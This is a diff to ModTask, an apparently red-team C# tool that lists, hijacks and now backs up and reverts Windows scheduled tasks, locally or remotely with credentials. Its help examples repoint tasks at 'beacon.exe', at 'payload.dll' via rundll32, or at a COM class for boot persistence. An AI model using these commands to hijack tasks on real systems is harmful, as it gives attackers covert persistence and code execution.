@@ -1,6 +1,7 @@
 using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.IO;
 using System.Runtime.InteropServices;
 using TaskScheduler;
 
@@ -89,7 +90,6 @@ namespace ModTask
                     ts.Connect();
                 }
 
-                ITaskFolder rootFolder = ts.GetFolder(@"\");
                 return ts;
             }
             catch (Exception e)
@@ -155,7 +155,8 @@ namespace ModTask
             string serverName, string username, string domain, string password,
             string taskToMod, string argExe, string exeArgs,
             bool sys, bool com, string classID,
-            bool boottrigger, bool timetrigger, string repDur, string repInter)
+            bool boottrigger, bool timetrigger, string repDur, string repInter,
+            string backupPath)
         {
             try
             {
@@ -171,6 +172,27 @@ namespace ModTask
 
                 IRegisteredTask returnedTask = GetModTask(tasks, taskToMod);
                 Console.WriteLine("[+] Task Path: {0}", returnedTask.Path);
+
+                if (timetrigger || boottrigger)
+                {
+                    string safeTaskName = string.Concat(returnedTask.Name.Split(Path.GetInvalidFileNameChars()));
+                    string autoFileName = safeTaskName + "_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".xml";
+
+                    string resolvedPath;
+                    if (string.IsNullOrEmpty(backupPath))
+                        resolvedPath = autoFileName;
+                    else if (Directory.Exists(backupPath))
+                        resolvedPath = Path.Combine(backupPath, autoFileName);
+                    else
+                        resolvedPath = backupPath;
+
+                    string parentDir = Path.GetDirectoryName(Path.GetFullPath(resolvedPath));
+                    if (!string.IsNullOrEmpty(parentDir) && !Directory.Exists(parentDir))
+                        Directory.CreateDirectory(parentDir);
+
+                    File.WriteAllText(resolvedPath, returnedTask.Xml);
+                    Console.WriteLine("[+] Saved original task XML to: " + Path.GetFullPath(resolvedPath));
+                }
 
                 ITaskDefinition taskdef = returnedTask.Definition;
                 IActionCollection taskActionCol = taskdef.Actions;
@@ -288,14 +310,89 @@ namespace ModTask
 
         static void SelectTask(string serverName, string username, string domain, string password, string selectTask)
         {
-            ITaskService ts = InitTaskScheduler(serverName, username, domain, password);
-            ITaskFolder rootFolder = ts.GetFolder(@"\");
+            try
+            {
+                ITaskService ts = InitTaskScheduler(serverName, username, domain, password);
+                if (ts == null)
+                {
+                    Console.WriteLine("[!] Failed to connect to Task Scheduler.");
+                    return;
+                }
 
-            List<IRegisteredTask> tasks = new List<IRegisteredTask>();
-            ListTasks(tasks, rootFolder);
+                ITaskFolder rootFolder = ts.GetFolder(@"\");
 
-            IRegisteredTask returnedTask = GetModTask(tasks, selectTask);
-            Console.WriteLine(returnedTask.Xml);
+                List<IRegisteredTask> tasks = new List<IRegisteredTask>();
+                ListTasks(tasks, rootFolder);
+
+                IRegisteredTask returnedTask = GetModTask(tasks, selectTask);
+                if (returnedTask == null)
+                {
+                    Console.WriteLine("[!] Failed to retrieve task definition.");
+                    return;
+                }
+
+                Console.WriteLine(returnedTask.Xml);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.ToString());
+            }
+        }
+
+        static void RevertTask(string serverName, string username, string domain, string password, string taskName, string xmlFile)
+        {
+            try
+            {
+                if (!File.Exists(xmlFile))
+                {
+                    Console.WriteLine("[!] XML backup file not found: " + xmlFile);
+                    return;
+                }
+
+                string xml = File.ReadAllText(xmlFile);
+
+                ITaskService ts = InitTaskScheduler(serverName, username, domain, password);
+                if (ts == null)
+                {
+                    Console.WriteLine("[!] Failed to connect to Task Scheduler.");
+                    return;
+                }
+
+                ITaskFolder rootFolder = ts.GetFolder(@"\");
+                if (rootFolder == null)
+                {
+                    Console.WriteLine("[!] Failed to get root task folder.");
+                    return;
+                }
+
+                List<IRegisteredTask> tasks = new List<IRegisteredTask>();
+                ListTasks(tasks, rootFolder);
+
+                IRegisteredTask returnedTask = GetModTask(tasks, taskName);
+                if (returnedTask == null)
+                {
+                    Console.WriteLine("[!] Failed to locate task: " + taskName);
+                    return;
+                }
+
+                string path = returnedTask.Path.Substring(0, returnedTask.Path.LastIndexOf("\\"));
+                if (string.IsNullOrEmpty(path))
+                    path = @"\";
+
+                ITaskFolder taskFolder = ts.GetFolder(path);
+                if (taskFolder == null)
+                {
+                    Console.WriteLine("[!] Failed to get task folder: " + path);
+                    return;
+                }
+
+                taskFolder.RegisterTask(taskName, xml, 4, null, null, _TASK_LOGON_TYPE.TASK_LOGON_NONE, null);
+                Console.WriteLine("[+] Successfully reverted task '{0}' from: {1}", taskName, xmlFile);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.ToString());
+            }
         }
 
         static void Logo()
@@ -308,6 +405,8 @@ namespace ModTask
 | \  / |\ `-' / /(|`-' /  | |  | |  |)|( `-'  ) | |) \  
 | |\/| | )---' (__)`--'   `-'  |_|  (_) `----'  |((_)-' 
 '-'  '-'(_)                                     (_)     
+@JSECUSECURITY
+
 ";
             Console.WriteLine(logo);
         }
@@ -315,12 +414,13 @@ namespace ModTask
         static void ShowHelp()
         {
             Console.WriteLine(@"
-Usage: ModTask.exe --mode <list|modify|select> [OPTIONS]
+Usage: ModTask.exe --mode <list|modify|select|revert> [OPTIONS]
 
 Modes:
   list     List all scheduled tasks on the target system.
   modify   Modify a scheduled task's action/trigger for execution.
   select   Print the full XML definition of a specific task.
+  revert   Restore a task to a previously saved XML backup.
 
 General Options:
   --mode, -m          (Required) Operation mode: list, modify, or select.
@@ -336,6 +436,10 @@ List Mode Options:
 Select Mode Options:
   --taskName, -t      Name of the task to inspect.
 
+Revert Mode Options:
+  --taskName, -t      (Required) Name of the task to revert.
+  --xmlFile, -f       (Required) Path to the XML backup file.
+
 Modify Mode Options:
   --taskName, -t      (Required) Name of the task to modify.
   --exePath, -e       Executable path for the new action.
@@ -347,6 +451,9 @@ Modify Mode Options:
   --repInterval, -r   Repetition interval (e.g., PT5M = 5 minutes).
   --repDuration       Repetition duration  (e.g., PT1H = 1 hour).
   --boottrigger, -b   Add a boot/startup trigger.
+  --backupPath        Directory or full file path for the XML backup written
+                      before modification (only used with --timetrigger or --boottrigger).
+                      Defaults to the current working directory.
 
 Examples:
   ModTask.exe --mode list
@@ -355,45 +462,85 @@ Examples:
   ModTask.exe --mode modify --taskName ""ScheduledDefrag"" --exePath ""C:\temp\beacon.exe""
   ModTask.exe --mode modify --taskName ""ScheduledDefrag"" --com --comClassID ""{CLSID}"" --boottrigger
   ModTask.exe --mode modify --taskName ""Cleanup"" --exePath ""rundll32.exe"" --exeArgs ""payload.dll,Start"" --timetrigger --repInterval PT5M --repDuration PT1H
+  ModTask.exe --mode revert --taskName ""ScheduledDefrag"" --xmlFile ""ScheduledDefrag_20240101_120000.xml""
 ");
+        }
+
+        static string StripQuotes(string s)
+        {
+            if (string.IsNullOrEmpty(s) || s.Length < 2)
+                return s ?? "";
+            if ((s[0] == '"' && s[s.Length - 1] == '"') || (s[0] == '\'' && s[s.Length - 1] == '\''))
+                return s.Substring(1, s.Length - 2);
+            return s;
         }
 
         static Dictionary<string, string> ParseArgs(string[] args)
         {
             var dict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
 
-            for (int i = 0; i < args.Length; i++)
+            try
             {
-                string arg = args[i];
-
-                if (arg.StartsWith("--"))
+                for (int i = 0; i < args.Length; i++)
                 {
-                    string key = arg.Substring(2);
+                    string arg = StripQuotes(args[i]);
 
-                    if (i + 1 < args.Length && !args[i + 1].StartsWith("-"))
+                    if (string.IsNullOrEmpty(arg))
+                        continue;
+
+                    if (arg.StartsWith("--"))
                     {
-                        dict[key] = args[i + 1];
-                        i++;
+                        string key = arg.Substring(2);
+                        if (string.IsNullOrEmpty(key))
+                            continue;
+
+                        if (i + 1 < args.Length)
+                        {
+                            string next = StripQuotes(args[i + 1]);
+                            if (!(next.StartsWith("--") || (next.StartsWith("-") && next.Length == 2)))
+                            {
+                                dict[key] = next;
+                                i++;
+                            }
+                            else
+                            {
+                                dict[key] = "true";
+                            }
+                        }
+                        else
+                        {
+                            dict[key] = "true";
+                        }
                     }
-                    else
+                    else if (arg.StartsWith("-"))
                     {
-                        dict[key] = "true";
+                        string key = arg.Substring(1);
+                        if (string.IsNullOrEmpty(key))
+                            continue;
+
+                        if (i + 1 < args.Length)
+                        {
+                            string next = StripQuotes(args[i + 1]);
+                            if (!(next.StartsWith("--") || (next.StartsWith("-") && next.Length == 2)))
+                            {
+                                dict[key] = next;
+                                i++;
+                            }
+                            else
+                            {
+                                dict[key] = "true";
+                            }
+                        }
+                        else
+                        {
+                            dict[key] = "true";
+                        }
                     }
                 }
-                else if (arg.StartsWith("-"))
-                {
-                    string key = arg.Substring(1);
-
-                    if (i + 1 < args.Length && !args[i + 1].StartsWith("-"))
-                    {
-                        dict[key] = args[i + 1];
-                        i++;
-                    }
-                    else
-                    {
-                        dict[key] = "true";
-                    }
-                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[!] Argument parsing error: " + e.Message);
             }
 
             return dict;
@@ -423,7 +570,7 @@ Examples:
         {
             Logo();
 
-            if (args.Length == 0 || args.Contains("--help") || args.Contains("-h"))
+            if (args.Length == 0 || HasFlag(ParseArgs(args), "help", "h"))
             {
                 ShowHelp();
                 return;
@@ -435,7 +582,7 @@ Examples:
 
             if (String.IsNullOrEmpty(mode))
             {
-                Console.WriteLine("[!] --mode is required.  Use --help for usage.");
+                Console.WriteLine("[!] --mode is required.");
                 return;
             }
 
@@ -449,8 +596,8 @@ Examples:
                 string taskName = GetOpt(opts, "taskName", "t");
                 if (!String.IsNullOrEmpty(taskName))
                 {
-                    Console.WriteLine("[+] Task Name should only be used in modify mode or select mode");
-                    Environment.Exit(0);
+                    Console.WriteLine("[!] --taskName is not valid for list mode.");
+                    return;
                 }
 
                 bool sddl = HasFlag(opts, "sddl", "c");
@@ -461,58 +608,98 @@ Examples:
                 string taskToMod = GetOpt(opts, "taskName", "t");
                 if (String.IsNullOrEmpty(taskToMod))
                 {
-                    Console.WriteLine("[+] --taskName is required for modify mode");
-                    Environment.Exit(0);
+                    Console.WriteLine("[!] --taskName is required for modify mode.");
+                    return;
                 }
 
+                bool com = HasFlag(opts, "com", "o");
                 string argExe = GetOpt(opts, "exePath", "e");
                 string exeArgs = GetOpt(opts, "exeArgs", "a");
-
-                bool sys = HasFlag(opts, "sys", "l");
-                bool com = HasFlag(opts, "com", "o");
-                bool timetrigger = HasFlag(opts, "timetrigger");
-                bool boottrigger = HasFlag(opts, "boottrigger", "b");
-
                 string classID = GetOpt(opts, "comClassID", "i");
-                string repInter = GetOpt(opts, "repInterval", "r");
-                string repDur = GetOpt(opts, "repDuration");
 
                 if (com)
                 {
+                    if (String.IsNullOrEmpty(classID))
+                    {
+                        Console.WriteLine("[!] --comClassID is required when using --com.");
+                        return;
+                    }
                     if (!String.IsNullOrEmpty(argExe))
                     {
-                        Console.WriteLine("[+] Exe can't be specified if using COM objects");
-                        Environment.Exit(0);
+                        Console.WriteLine("[!] --exePath cannot be used with --com.");
+                        return;
                     }
                     if (!String.IsNullOrEmpty(exeArgs))
                     {
-                        Console.WriteLine("[+] Exe Arguments can't be specified if using COM objects");
-                        Environment.Exit(0);
+                        Console.WriteLine("[!] --exeArgs cannot be used with --com.");
+                        return;
                     }
                 }
+                else
+                {
+                    if (String.IsNullOrEmpty(argExe))
+                    {
+                        Console.WriteLine("[!] --exePath is required for modify mode.");
+                        return;
+                    }
+                }
+
+                bool timetrigger = HasFlag(opts, "timetrigger");
+                bool boottrigger = HasFlag(opts, "boottrigger", "b");
+                string repInter = GetOpt(opts, "repInterval", "r");
+                string repDur = GetOpt(opts, "repDuration");
+
+                if (timetrigger && String.IsNullOrEmpty(repInter))
+                {
+                    Console.WriteLine("[!] --repInterval is required when using --timetrigger.");
+                    return;
+                }
+
+                bool sys = HasFlag(opts, "sys", "l");
+                string backupPath = GetOpt(opts, "backupPath");
 
                 ModTaskStart(serverName, username, domain, password,
                              taskToMod, argExe, exeArgs,
                              sys, com, classID,
-                             boottrigger, timetrigger, repDur, repInter);
+                             boottrigger, timetrigger, repDur, repInter,
+                             backupPath);
             }
             else if (mode == "select")
             {
                 string taskToSelect = GetOpt(opts, "taskName", "t");
                 if (String.IsNullOrEmpty(taskToSelect))
                 {
-                    Console.WriteLine("[+] --taskName is required for select mode");
-                    Environment.Exit(0);
+                    Console.WriteLine("[!] --taskName is required for select mode.");
+                    return;
                 }
 
                 SelectTask(serverName, username, domain, password, taskToSelect);
             }
+            else if (mode == "revert")
+            {
+                string taskToRevert = GetOpt(opts, "taskName", "t");
+                if (String.IsNullOrEmpty(taskToRevert))
+                {
+                    Console.WriteLine("[!] --taskName is required for revert mode.");
+                    return;
+                }
+
+                string xmlFile = GetOpt(opts, "xmlFile", "f");
+                if (String.IsNullOrEmpty(xmlFile))
+                {
+                    Console.WriteLine("[!] --xmlFile is required for revert mode.");
+                    return;
+                }
+
+                RevertTask(serverName, username, domain, password, taskToRevert, xmlFile);
+            }
             else
             {
-                Console.WriteLine("[!] Unknown mode: {0}.  Valid modes: list, modify, select", mode);
-                ShowHelp();
+                Console.WriteLine("[!] Unknown mode '{0}'. Valid modes: list, modify, select, revert.", mode);
+                return;
             }
         }
     }
 }
+
 
